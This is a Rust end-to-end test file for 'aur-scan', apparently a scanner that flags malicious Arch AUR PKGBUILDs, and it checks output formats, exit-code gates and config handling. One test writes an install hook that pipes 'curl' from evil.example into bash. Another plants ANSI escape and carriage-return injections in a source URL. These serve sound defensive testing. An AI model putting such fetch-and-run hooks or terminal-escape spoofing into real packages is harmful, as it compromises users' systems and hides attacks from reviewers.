//! End-to-end CLI behavior tests.
//!
//! These run the real `aur-scan` binary against the repository's PKGBUILD
//! fixtures and assert on its actual stdout/stderr/exit code -- the layer unit
//! tests do not cover. They exist because the unit tests all passed while the
//! binary was emitting a human summary onto its own JSON stdout (making
//! `--format json | jq` fail), a new detection code had no catalog entry, and a
//! finding was mis-severitied. A test that *runs the program the way a user
//! does* catches that class of bug.

use std::path::{Path, PathBuf};
use std::process::Command;

use aur_scanner_core::catalog::Catalog;

/// Path to the compiled `aur-scan` binary under test (provided by Cargo).
fn bin() -> &'static str {
    env!("CARGO_BIN_EXE_aur-scan")
}

/// Workspace `tests/fixtures` directory.
fn fixtures() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("../../tests/fixtures")
}

fn fixture_dirs(kind: &str) -> Vec<PathBuf> {
    let mut dirs: Vec<PathBuf> = std::fs::read_dir(fixtures().join(kind))
        .unwrap_or_else(|e| panic!("reading fixtures/{kind}: {e}"))
        .flatten()
        .map(|e| e.path())
        .filter(|p| p.join("PKGBUILD").is_file())
        .collect();
    dirs.sort();
    assert!(!dirs.is_empty(), "no {kind} fixtures found");
    dirs
}

/// Run `aur-scan scan <dir> --format <fmt>` and return (stdout, stderr, code).
fn scan(dir: &Path, fmt: &str) -> (Vec<u8>, Vec<u8>, i32) {
    let out = Command::new(bin())
        .args([
            "scan",
            dir.to_str().unwrap(),
            "--include-info",
            "--format",
            fmt,
        ])
        .output()
        .expect("failed to run aur-scan");
    (out.stdout, out.stderr, out.status.code().unwrap_or(-1))
}

fn parse_findings(stdout: &[u8]) -> Vec<serde_json::Value> {
    // from_slice (not a lenient reader) rejects ANY trailing bytes after the
    // JSON document -- this is the exact assertion the summary-on-stdout bug
    // failed.
    let v: serde_json::Value = serde_json::from_slice(stdout).unwrap_or_else(|e| {
        panic!(
            "stdout was not a single clean JSON document: {e}\n--- stdout ---\n{}",
            String::from_utf8_lossy(stdout)
        )
    });
    v["findings"].as_array().cloned().unwrap_or_default()
}

fn severities(findings: &[serde_json::Value]) -> (usize, usize) {
    let count = |s: &str| findings.iter().filter(|f| f["severity"] == s).count();
    (count("critical"), count("high"))
}

#[test]
fn json_stdout_is_clean_and_parseable() {
    // Regression for the summary-corrupts-stdout bug: every fixture's JSON
    // output must parse with no trailing data.
    for dir in fixture_dirs("malicious")
        .into_iter()
        .chain(fixture_dirs("clean"))
    {
        let (stdout, _err, _code) = scan(&dir, "json");
        let findings = parse_findings(&stdout);
        // Sanity: each finding has the fields downstream tooling relies on.
        for f in &findings {
            assert!(f["id"].is_string(), "finding missing id in {dir:?}");
            assert!(
                f["severity"].is_string(),
                "finding missing severity in {dir:?}"
            );
        }
    }
}

#[test]
fn sarif_stdout_is_valid() {
    let dir = &fixture_dirs("malicious")[0];
    let (stdout, _err, _code) = scan(dir, "sarif");
    let v: serde_json::Value =
        serde_json::from_slice(&stdout).expect("SARIF stdout must be a single clean JSON document");
    assert!(
        v["runs"][0]["results"].is_array(),
        "SARIF missing runs[0].results"
    );
}

#[test]
fn every_malicious_fixture_is_detected() {
    for dir in fixture_dirs("malicious") {
        let (stdout, _err, _code) = scan(&dir, "json");
        let (c, h) = severities(&parse_findings(&stdout));
        assert!(
            c + h > 0,
            "malicious fixture {dir:?} produced no critical/high findings -- a detection regression"
        );
    }
}

#[test]
fn clean_fixtures_have_no_critical_or_high() {
    for dir in fixture_dirs("clean") {
        let (stdout, _err, _code) = scan(&dir, "json");
        let (c, h) = severities(&parse_findings(&stdout));
        assert_eq!(
            (c, h),
            (0, 0),
            "clean fixture {dir:?} produced a critical/high finding -- a false positive"
        );
    }
}

#[test]
fn every_emitted_finding_id_exists_in_the_catalog() {
    // Catch catalog drift (a new detection code with no `explain`/`codes`
    // entry, like SRC-007 was). Built-in finding IDs emitted on the fixtures
    // must all resolve in the catalog. (Community rules from rules.d are
    // skipped so the test stays hermetic across machines.)
    let catalog = Catalog::load();
    let builtin: std::collections::HashSet<String> =
        catalog.entries.iter().map(|e| e.id.clone()).collect();
    for dir in fixture_dirs("malicious")
        .into_iter()
        .chain(fixture_dirs("clean"))
    {
        let (stdout, _err, _code) = scan(&dir, "json");
        for f in parse_findings(&stdout) {
            let id = f["id"].as_str().unwrap_or("");
            // Only assert on IDs the built-in catalog is responsible for: a
            // built-in ID follows the FAMILY-NNN / EXEC-REMOTE shape and is one
            // the shipped analyzers emit. Unknown community IDs are ignored.
            let looks_builtin = id == "EXEC-REMOTE"
                || id
                    .split_once('-')
                    .map(|(fam, num)| {
                        !fam.is_empty()
                            && fam.chars().all(|c| c.is_ascii_uppercase())
                            && num.chars().all(|c| c.is_ascii_digit())
                    })
                    .unwrap_or(false);
            if looks_builtin {
                assert!(
                    builtin.contains(id),
                    "finding {id} (from {dir:?}) is emitted but missing from the catalog; \
                     `aur-scan explain {id}` would say 'Unknown code'"
                );
            }
        }
    }
}

#[test]
fn fail_on_sets_exit_code() {
    let mal = &fixture_dirs("malicious")[0];
    let clean = &fixture_dirs("clean")[0];

    let code = |dir: &Path, threshold: &str| {
        Command::new(bin())
            .args(["scan", dir.to_str().unwrap(), "--fail-on", threshold, "-q"])
            .output()
            .unwrap()
            .status
            .code()
            .unwrap_or(-1)
    };

    assert_eq!(
        code(mal, "critical"),
        1,
        "malicious must exit 1 under --fail-on critical"
    );
    assert_eq!(
        code(clean, "critical"),
        0,
        "clean must exit 0 under --fail-on critical"
    );
}

/// Run `aur-scan` with arbitrary args and return (stdout, stderr, code).
fn run(args: &[&str]) -> (String, String, i32) {
    let out = Command::new(bin())
        .args(args)
        .output()
        .expect("failed to run aur-scan");
    (
        String::from_utf8_lossy(&out.stdout).into_owned(),
        String::from_utf8_lossy(&out.stderr).into_owned(),
        out.status.code().unwrap_or(-1),
    )
}

#[test]
fn completions_generate_for_every_documented_shell() {
    // Issue #7 acceptance: bash, zsh, and fish all emit a script.
    for shell in ["bash", "zsh", "fish"] {
        let (stdout, stderr, code) = run(&["completions", shell]);
        assert_eq!(code, 0, "completions {shell} exited {code}: {stderr}");
        assert!(
            stdout.len() > 500,
            "completions {shell} produced {} bytes, which is not a real script",
            stdout.len()
        );
        // The script must actually know about this binary's commands, or it is
        // a well-formed but useless file.
        assert!(
            stdout.contains("aur-scan"),
            "completions {shell} does not mention the binary name"
        );
        for sub in ["scan", "check", "install", "system", "explain", "codes"] {
            assert!(
                stdout.contains(sub),
                "completions {shell} is missing subcommand {sub:?}"
            );
        }
    }
}

#[test]
fn completions_do_not_require_a_readable_config() {
    // A typo in config.toml is a hard error for scanning, deliberately. It must
    // NOT stop someone installing shell completions, or one bad character in a
    // config file breaks their shell setup at package-install time.
    let dir = std::env::temp_dir().join("aur-scan-bad-config-test");
    std::fs::create_dir_all(&dir).unwrap();
    let bad = dir.join("broken.toml");
    std::fs::write(&bad, "this is not = = valid toml [[[").unwrap();

    let (stdout, _, code) = run(&["-c", bad.to_str().unwrap(), "completions", "bash"]);
    assert_eq!(code, 0, "completions must not depend on config validity");
    assert!(stdout.contains("aur-scan"));

    // Sanity: that same config really is rejected on a scanning path, so this
    // test is proving an exemption rather than that the config is fine.
    //
    // The control is `scan`, not `codes`: `codes` is itself an exempt
    // reference command now (see
    // `a_broken_config_does_not_disable_the_reference_commands`), so using it
    // here would assert the exemption against another exemption and pass for
    // the wrong reason. Only a real scanning path proves the hard error.
    let pkg = dir.join("pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("PKGBUILD"),
        "pkgname=x\npkgver=1.0\npkgrel=1\narch=('x86_64')\n",
    )
    .unwrap();
    let (_, _, scan_code) = run(&["-c", bad.to_str().unwrap(), "scan", pkg.to_str().unwrap()]);
    assert_ne!(scan_code, 0, "a malformed config must still fail elsewhere");

    std::fs::remove_file(&bad).ok();
    std::fs::remove_dir_all(&pkg).ok();
}

#[test]
fn completions_rejects_an_unknown_shell() {
    let (_, stderr, code) = run(&["completions", "smoothshell"]);
    assert_ne!(code, 0);
    assert!(
        stderr.contains("invalid value") || stderr.contains("possible values"),
        "expected a clap value error, got: {stderr}"
    );
}

/// Every call site of `Scanner::scan_pkgbuild` / `scan_directory` must state
/// which scan it wants, and a `Registry::None` must be a deliberate, commented
/// choice rather than an omission.
///
/// This is a source-level test because the defect it guards against is not
/// observable at runtime: a reduced scan is not an error, it is just quieter.
/// Seven of eight callers silently ran the reduced analyzer set -- including
/// `install`, the AUR-helper wrapper, and the pacman hook, the three paths that
/// actually gate an installation -- and 383 passing tests did not notice.
#[test]
fn every_registry_none_call_site_is_deliberate() {
    let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("../..");

    // Paths where a registry-less scan is CORRECT, with the reason. Anything
    // not on this list that passes Registry::None is a regression.
    let sanctioned: &[(&str, &str)] = &[
        (
            "crates/aur-scanner-cli/src/commands/scan.rs",
            "a bare path scan has no package identity to look up",
        ),
        (
            "crates/aur-scanner-cli/src/commands/diff.rs",
            "diff compares two directories and must stay stateless for CI",
        ),
        (
            "crates/aur-scanner-hook/src/main.rs",
            "the pacman hook is offline by design inside a transaction",
        ),
        (
            "crates/aur-scanner-cli/src/commands/system.rs",
            "a cached scan without --rescan has no live AUR record",
        ),
        (
            "crates/aur-scanner-core/src/lib.rs",
            "the enum's own definition, plus a test fixture",
        ),
        (
            "crates/aur-scanner-cli/src/commands/check.rs",
            "fallback arm only: used when the AUR RPC returned no record for a \
             node, where there is genuinely nothing to supply. The paired \
             `Registry::From` arm is asserted by \
             installation_gating_paths_build_registry_context",
        ),
        (
            "crates/aur-scanner-cli/src/commands/install.rs",
            "fallback arm only, same as check.rs",
        ),
        (
            "crates/aur-scanner-plugin/src/lib.rs",
            "doc comment on the embedder API explaining when each variant applies",
        ),
        (
            "crates/aur-scanner-core/tests/detection_hardening.rs",
            "offline detection fixtures: they pin the analyzers on a PKGBUILD \
             on disk, where there is no AUR record to supply",
        ),
    ];

    let mut offenders = Vec::new();
    let mut walk = vec![root.join("crates")];
    while let Some(dir) = walk.pop() {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for e in entries.flatten() {
            let p = e.path();
            if p.is_dir() {
                if p.file_name().is_some_and(|n| n == "target") {
                    continue;
                }
                walk.push(p);
            } else if p.extension().and_then(|x| x.to_str()) == Some("rs") {
                // Skip this test file: it necessarily names the thing it guards.
                if p.file_name().is_some_and(|n| n == "cli_behavior.rs") {
                    continue;
                }
                let Ok(src) = std::fs::read_to_string(&p) else {
                    continue;
                };
                if !src.contains("Registry::None") {
                    continue;
                }
                let rel = p
                    .strip_prefix(&root)
                    .unwrap_or(&p)
                    .to_string_lossy()
                    .replace('\\', "/");
                if !sanctioned.iter().any(|(s, _)| rel.ends_with(s)) {
                    offenders.push(rel);
                }
            }
        }
    }

    assert!(
        offenders.is_empty(),
        "these files pass Registry::None but are not on the sanctioned list. \
         If the reduced analyzer set is genuinely correct there, add the file \
         and the reason to `sanctioned` in this test -- note that sanctioning \
         exempts the WHOLE file, so prefer keeping registry-less scans in files \
         that do nothing else. If it is not correct, wire real registry context \
         instead: {offenders:?}"
    );
}

/// The paths that gate an installation must build real registry context, or the
/// operator's `[[owned_namespaces]]` declarations and every OWN-*/SQUAT-* code
/// are silently inert exactly where they matter most.
#[test]
fn installation_gating_paths_build_registry_context() {
    let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("../..");
    for (rel, why) in [
        (
            "crates/aur-scanner-cli/src/commands/check.rs",
            "pre-install check",
        ),
        (
            "crates/aur-scanner-cli/src/commands/install.rs",
            "the race-free path that actually builds",
        ),
    ] {
        let src = std::fs::read_to_string(root.join(rel))
            .unwrap_or_else(|e| panic!("reading {rel}: {e}"));
        assert!(
            src.contains("Registry::From"),
            "{rel} ({why}) must supply registry context; without it \
             SQUAT-*, OWN-* and [[owned_namespaces]] cannot fire on this path"
        );
    }

    // The AUR-helper wrapper every paru/yay/nushell user goes through does not
    // scan in-process: it hands the decision to `aur-scan check` / `aur-scan
    // install`, which build the registry context checked above. Pin that
    // delegation, and that no in-process scan without context creeps back in.
    let rel = "crates/aur-scanner-plugin/src/bin/wrapper.rs";
    let src =
        std::fs::read_to_string(root.join(rel)).unwrap_or_else(|e| panic!("reading {rel}: {e}"));
    assert!(
        src.contains("Command::new(\"aur-scan\")")
            && src.contains("\"check\"")
            && src.contains("\"install\""),
        "{rel} must delegate scanning to `aur-scan check`/`install` so the \
         registry context (SQUAT-*, OWN-*, [[owned_namespaces]]) applies"
    );
    for in_process in [
        "Registry::None",
        "scan_pkgbuild",
        "scan_directory",
        "Scanner::new",
    ] {
        assert!(
            !src.contains(in_process),
            "{rel} scans in-process ({in_process}); route it through \
             `aur-scan check` or supply Registry::From"
        );
    }
}

/// `check` and `install` must both record scan history, or a package installed
/// through one is invisible to change detection in the other.
#[test]
fn both_installing_paths_record_scan_history() {
    let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("../..");
    for rel in [
        "crates/aur-scanner-cli/src/commands/check.rs",
        "crates/aur-scanner-cli/src/commands/install.rs",
    ] {
        let src = std::fs::read_to_string(root.join(rel))
            .unwrap_or_else(|e| panic!("reading {rel}: {e}"));
        assert!(
            src.contains("diff_against_history"),
            "{rel} must compare against and record scan history; otherwise it \
             lays no baseline and the NEXT scan takes the silent first-scan \
             branch while recording post-compromise state as normal"
        );
    }
}

/// A finding's severity must match what the catalog declares for its ID.
///
/// One ID with two severities is not a cosmetic inconsistency: `aur-scan codes`,
/// the README tables, every `--fail-on <sev>` gate, and the fail-closed hook and
/// wrapper all decide from the catalog. `SQUAT-001` shipped with a Critical path
/// and a High path, so a CI job gating on Critical would have passed an
/// impersonating package that the docs promised would block it.
#[test]
fn emitted_severity_matches_the_catalog() {
    // Codes whose severity is deliberately variable, each documented as such in
    // its catalog entry. Anything not on this list must be fixed, not added.
    const VARIABLE: &[&str] = &[
        "DIFF-001", // tracks the severity of the worst NEW finding
        "DIFF-002", // High for adoption of an orphan, Medium for a handover
        "DIFF-004", // High when a script appears, Medium when one changes
        // Escalates from Low when combined with provides/replaces of a trusted
        // name -- stated in its own catalog description.
        "META-004",
    ];

    let catalog = Catalog::load();
    let mut mismatches: Vec<String> = Vec::new();
    let mut checked = 0usize;

    for kind in ["malicious", "clean"] {
        for dir in fixture_dirs(kind) {
            let (stdout, _, _) = scan(&dir, "json");
            for f in parse_findings(&stdout) {
                let id = f["id"].as_str().unwrap_or_default();
                if VARIABLE.contains(&id) {
                    continue;
                }
                let Some(entry) = catalog.get(id) else {
                    continue; // covered by every_emitted_finding_id_exists_in_the_catalog
                };
                // JSON serialises severity lowercase; Debug renders it
                // capitalised. Compare case-insensitively.
                let emitted = f["severity"]
                    .as_str()
                    .unwrap_or_default()
                    .to_ascii_lowercase();
                let declared = format!("{:?}", entry.severity).to_ascii_lowercase();
                checked += 1;
                if emitted != declared {
                    mismatches.push(format!(
                        "{id} emitted {emitted} but the catalog declares {declared} \
                         (fixture {})",
                        dir.file_name().unwrap_or_default().to_string_lossy()
                    ));
                }
            }
        }
    }

    mismatches.sort();
    mismatches.dedup();
    assert!(
        mismatches.is_empty(),
        "severity drift between the analyzers and the catalog. Every gate and \
         every doc table reads the catalog, so a mismatch means the tool blocks \
         differently than it documents:\n  {}",
        mismatches.join("\n  ")
    );
    assert!(
        checked > 20,
        "only {checked} findings were severity-checked; the fixtures may not be \
         exercising the analyzers"
    );
}

/// `aur-scan version` must report on a BROKEN config, not fail to start because
/// of it.
///
/// Every scanning path treats an invalid config as a hard error, and the pacman
/// hook exits non-zero on one — which aborts the whole transaction. That is the
/// right fail-closed posture for a security gate, but it means a stale key in
/// `/etc/aur-scanner/config.toml` announces itself by breaking `pacman -Syu`.
/// This command is the way to find out on purpose, so it cannot be a casualty
/// of the thing it diagnoses.
#[test]
fn version_diagnoses_a_broken_config_instead_of_dying_on_it() {
    let dir = std::env::temp_dir().join("aur-scan-version-cfg-test");
    std::fs::create_dir_all(&dir).unwrap();
    let bad = dir.join("stale.toml");
    // Valid TOML, unknown key — the realistic upgrade case.
    std::fs::write(&bad, "min_severity = \"high\"\nenable_thret_intel = true\n").unwrap();

    let (stdout, _, code) = run(&["-c", bad.to_str().unwrap(), "version"]);
    assert!(
        stdout.contains("Configuration:"),
        "version must still render its report: {stdout}"
    );
    assert!(
        stdout.contains("INVALID"),
        "version must say the config is invalid: {stdout}"
    );
    assert!(
        stdout.contains("enable_thret_intel"),
        "it must name the offending key so it can be fixed: {stdout}"
    );
    assert_ne!(code, 0, "usable as a pre-upgrade check in a script");

    // And a valid config reports clean, exit 0.
    let good = dir.join("ok.toml");
    std::fs::write(&good, "min_severity = \"high\"\n").unwrap();
    let (stdout, _, code) = run(&["-c", good.to_str().unwrap(), "version"]);
    assert_eq!(code, 0);
    assert!(stdout.contains("config is valid"), "{stdout}");

    std::fs::remove_file(&bad).ok();
    std::fs::remove_file(&good).ok();
}

/// A broken config must not disable the commands you use to debug a broken
/// config.
///
/// External review, 2.2.0-rc.1: config resolution moved ahead of the command
/// match, so a malformed file hard-failed `explain`, `codes`, `rules` and `ioc`
/// too. Those read nothing but the built-in rule table — being unable to run
/// them is pure collateral damage from the fail-closed posture the scanning
/// paths need.
#[test]
fn a_broken_config_does_not_disable_the_reference_commands() {
    let dir = std::env::temp_dir().join("aur-scan-broken-cfg-reference-test");
    std::fs::create_dir_all(&dir).unwrap();
    let bad = dir.join("broken.toml");
    // Not even valid TOML — the worst case, and what a hostile or truncated
    // write leaves behind.
    std::fs::write(&bad, "min_severity = [unterminated\n").unwrap();
    let cfg = bad.to_str().unwrap();

    for args in [
        vec!["-c", cfg, "explain", "SHELL-002"],
        vec!["-c", cfg, "rules"],
        vec!["-c", cfg, "ioc"],
        vec!["-c", cfg, "codes"],
    ] {
        let (stdout, stderr, code) = run(&args);
        assert_eq!(
            code, 0,
            "{args:?} must still run with a broken config: {stdout}{stderr}"
        );
        assert!(
            !stdout.trim().is_empty(),
            "{args:?} must still produce its output: {stderr}"
        );
    }

    // `codes` degrades rather than dying, so it must SAY that a custom
    // rules_path is not reflected — silently listing the wrong set would be
    // worse than refusing.
    let (_, stderr, _) = run(&["-c", cfg, "codes"]);
    assert!(
        stderr.contains("rules_path"),
        "codes must warn that a custom rules_path was not honoured: {stderr}"
    );

    // The scanning paths must NOT have been softened by any of this.
    let pkg = dir.join("pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("PKGBUILD"),
        "pkgname=x\npkgver=1.0\npkgrel=1\narch=('x86_64')\n",
    )
    .unwrap();
    let (_, _, code) = run(&["-c", cfg, "scan", pkg.to_str().unwrap()]);
    assert_ne!(
        code, 0,
        "a malformed config must still be a hard error for scan"
    );

    std::fs::remove_file(&bad).ok();
    std::fs::remove_dir_all(&pkg).ok();
}

/// Package-controlled text must never reach the terminal as live escape codes.
///
/// Findings quote source URLs, pkgnames, and matched snippets verbatim. Printed
/// raw, an injected escape sequence lets the scanned file drive the display of
/// the tool that is scanning it — cursor movement can overwrite the severity
/// that was just printed, and SGR can recolour a Critical to look benign.
#[test]
fn package_controlled_text_cannot_inject_terminal_escapes() {
    let dir = std::env::temp_dir().join("aur-scan-ansi-injection-test");
    std::fs::create_dir_all(&dir).unwrap();
    // ESC in a source URL, plus a bare CR which can rewrite the current line.
    let pkgbuild = format!(
        "pkgname=ansi-test\npkgver=1.0\npkgrel=1\narch=('x86_64')\n\
         source=(\"https://example.com/{esc}[31mFAKE-CLEAN{esc}[0m/x.tar.gz\"\n        \
         \"payload{cr}ok.tar.gz\")\nsha256sums=('SKIP' 'SKIP')\n",
        esc = '\u{1b}',
        cr = '\r'
    );
    std::fs::write(dir.join("PKGBUILD"), pkgbuild).unwrap();

    let (stdout, stderr, _) = run(&["scan", dir.to_str().unwrap()]);
    let combined = format!("{stdout}{stderr}");

    // The tool's OWN colour codes are fine; an ESC that came from the package
    // is not. Assert on the specific injected sequences.
    assert!(
        !combined.contains("\u{1b}[31mFAKE-CLEAN"),
        "attacker SGR reached the terminal: {combined:?}"
    );
    assert!(
        !combined.contains('\r'),
        "attacker carriage return reached the terminal (can rewrite a printed severity)"
    );
    // Neutralised, not silently dropped — a reviewer should see something odd
    // was there.
    assert!(
        combined.contains("\\x1B"),
        "the escape should be shown as an escape, not removed: {combined:?}"
    );
    assert!(
        combined.contains("FAKE-CLEAN"),
        "the readable content must survive so the finding still makes sense"
    );

    // JSON is consumed by programs, and serde escapes control characters, so it
    // legitimately carries the raw value — but it must still be valid JSON.
    let (json, _, _) = run(&["scan", dir.to_str().unwrap(), "--format", "json"]);
    serde_json::from_str::<serde_json::Value>(&json)
        .expect("JSON output must stay parseable with hostile input");

    std::fs::remove_dir_all(&dir).ok();
}

/// Run `aur-scan check --local <dir> --no-deps --no-confirm` (no `--fail-on`)
/// and return its exit code. `--local` + `--no-deps` keeps it off the network.
fn check_no_confirm(dir: &Path) -> i32 {
    Command::new(bin())
        .args([
            "check",
            "--local",
            dir.to_str().unwrap(),
            "--no-deps",
            "--no-confirm",
            "-q",
        ])
        .output()
        .unwrap()
        .status
        .code()
        .unwrap_or(-1)
}

#[test]
fn non_interactive_check_fails_closed_on_critical() {
    // This is exactly how the shell integrations call `check` when
    // AUR_SCAN_INTERACTIVE=0: `--no-confirm` and no `--fail-on`. It used to exit
    // 0 on a tree full of Criticals, so paru/yay went ahead. With no prompt to
    // fall back on, a non-interactive run must gate on Critical by itself.
    let mut checked = 0;
    for dir in fixture_dirs("malicious") {
        let (stdout, _, _) = scan(&dir, "json");
        let (critical, _) = severities(&parse_findings(&stdout));
        if critical == 0 {
            continue;
        }
        checked += 1;
        assert_ne!(
            check_no_confirm(&dir),
            0,
            "{dir:?} has {critical} Critical finding(s); `check --no-confirm` must not exit 0"
        );
    }
    assert!(checked > 0, "no malicious fixture produced a Critical");

    for dir in fixture_dirs("clean") {
        assert_eq!(
            check_no_confirm(&dir),
            0,
            "{dir:?} is clean; `check --no-confirm` must pass it"
        );
    }
}

#[test]
fn readme_detection_table_matches_builtin_catalog() {
    // The README's "Detection Rules Reference" is pasted from
    // `aur-scan codes --format markdown`. It drifted once: 2.2.0-rc.1 shipped
    // 20 new codes while the README table still listed the 2.1 set and its prose
    // gave two different totals. Compare against the BUILT-IN catalog only, so
    // community rules installed on the test machine cannot affect the result.
    let readme =
        std::fs::read_to_string(Path::new(env!("CARGO_MANIFEST_DIR")).join("../../README.md"))
            .expect("read README.md");
    let start = readme
        .find("## Detection Rules Reference")
        .expect("README has a Detection Rules Reference section");
    let end = start
        + readme[start..]
            .find("## Custom & Community Rules")
            .expect("reference section is followed by Custom & Community Rules");
    let section = &readme[start..end];

    // (id, severity, name, category, detector): every column the table shows
    // except CWE-free cosmetics must match the catalog, not just id+severity.
    type Row = (String, String, String, String, String);
    let mut documented: Vec<Row> = Vec::new();
    let mut severity = String::new();
    for line in section.lines() {
        if let Some(rest) = line.strip_prefix("## ") {
            severity = rest.trim_end_matches(" severity").to_string();
        } else if let Some(rest) = line.strip_prefix("| `") {
            let id = rest.split('`').next().unwrap_or_default().to_string();
            let cols: Vec<&str> = line.split('|').map(str::trim).collect();
            // cols: ["", code, name, category, detector, cwe, ""]
            assert!(cols.len() >= 6, "malformed README table row: {line}");
            documented.push((
                id,
                severity.clone(),
                cols[2].to_string(),
                cols[3].to_string(),
                cols[4].to_string(),
            ));
        }
    }
    documented.sort();

    let mut builtin: Vec<Row> = Catalog::load()
        .entries
        .into_iter()
        .filter(|e| e.owner != "user")
        .map(|e| {
            (
                e.id,
                e.severity.to_string(),
                e.name,
                e.category.to_string(),
                e.owner,
            )
        })
        .collect();
    builtin.sort();

    assert_eq!(
        documented, builtin,
        "README detection table is out of date; regenerate it with \
         `aur-scan codes --format markdown`"
    );
    let stated = format!("The **{} built-in detection codes**", builtin.len());
    assert!(
        section.contains(&stated),
        "README should say {stated:?} to match the catalog"
    );
}

/// A scratch package directory unique to this process and test.
fn scratch_pkg(name: &str, pkgbuild_extra: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!("aur-scan-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(
        dir.join("PKGBUILD"),
        format!("pkgname=demo\npkgver=1\npkgrel=1\narch=('any')\n{pkgbuild_extra}\npackage() {{ :; }}\n"),
    )
    .unwrap();
    dir
}

/// A user-writable `min_severity = "critical"` is a DISPLAY setting. It used to
/// drop High findings inside the scan, before `--fail-on high` ran, so the gate
/// passed a package it should have blocked.
#[test]
fn min_severity_config_cannot_disable_a_gate() {
    let dir = scratch_pkg("minsev", "source=('https://example.com/a.tar.gz')");
    let cfg = dir.join("cfg.toml");
    std::fs::write(&cfg, "min_severity = \"critical\"\n").unwrap();

    let (_, _, code) = run(&[
        "-c",
        cfg.to_str().unwrap(),
        "scan",
        dir.to_str().unwrap(),
        "--fail-on",
        "high",
        "-q",
    ]);
    std::fs::remove_dir_all(&dir).ok();
    assert_eq!(code, 1, "High finding must still trip --fail-on high");
}

/// One non-UTF-8 byte in an install script used to make the scan report clean.
#[test]
fn non_utf8_install_script_cannot_hide_a_payload() {
    let dir = scratch_pkg("nonutf8", "install=demo.install");
    let mut bytes = b"# \xff\n".to_vec();
    bytes.extend_from_slice(b"post_install() { curl -s https://evil.example/x.sh | bash; }\n");
    std::fs::write(dir.join("demo.install"), bytes).unwrap();
    let (_, _, code) = run(&["scan", dir.to_str().unwrap(), "--fail-on", "critical", "-q"]);
    std::fs::remove_dir_all(&dir).ok();
    assert_eq!(code, 1);
}

/// When the severity floor hides the finding that trips `--fail-on`, text must
/// say so (not "No security issues found."), and JSON must keep every finding.
#[test]
fn hidden_gate_finding_is_reported_and_json_stays_complete() {
    let dir = scratch_pkg("hiddengate", "source=('https://example.com/a.tar.gz')");
    let d = dir.to_str().unwrap();
    let (out, _, code) = run(&["scan", d, "-s", "critical", "--fail-on", "high"]);
    assert_eq!(code, 1);
    assert!(
        !out.contains("No security issues found."),
        "text claims clean while the gate tripped: {out}"
    );
    assert!(
        out.contains("hidden by --severity/min_severity; the gate tripped"),
        "{out}"
    );
    let (json, _, _) = run(&["scan", d, "-s", "critical", "--format", "json"]);
    let v: serde_json::Value = serde_json::from_str(&json).unwrap();
    assert!(
        !v["findings"].as_array().unwrap().is_empty(),
        "JSON must be the complete record"
    );
    // Closest benign form: nothing hidden, genuinely clean.
    let clean = scratch_pkg("hiddenclean", "");
    let (out, _, code) = run(&[
        "scan",
        clean.to_str().unwrap(),
        "-s",
        "critical",
        "--fail-on",
        "high",
    ]);
    assert_eq!(code, 0);
    assert!(out.contains("No security issues found."), "{out}");
    std::fs::remove_dir_all(&dir).ok();
    std::fs::remove_dir_all(&clean).ok();
}
